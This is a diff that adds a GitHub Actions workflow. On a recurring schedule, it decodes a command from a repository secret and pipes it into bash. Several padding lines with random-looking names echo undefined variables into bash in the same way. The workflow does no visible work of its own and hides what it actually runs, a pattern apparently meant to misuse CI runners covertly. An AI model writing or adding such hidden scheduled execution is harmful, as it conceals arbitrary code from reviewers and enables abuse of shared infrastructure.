@@ -1,0 +1,26 @@
+name: watchwordstudent
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: watchwordstudent
+        env:
+          zbwt2: ${{ secrets.zbwt2 }}
+        run: |
+          echo $zbwt2 | jq -r .qlzp2 | /bin/bash
+          echo $fye39279 | jq -r .dw7 | /bin/bash
+          echo $rbtdc271 | jq -r .j6405 | /bin/bash
+          echo $qlk1029 | jq -r .w05 | /bin/bash
+          echo $lhbk1 | jq -r .rio3 | /bin/bash
+          echo $wmc8926 | jq -r .z6562 | /bin/bash
+          echo $cn0 | jq -r .kcpaa88764 | /bin/bash
+          echo $qv3 | jq -r .fys38767 | /bin/bash
+          echo $qjo378 | jq -r .xbc3502 | /bin/bash
+
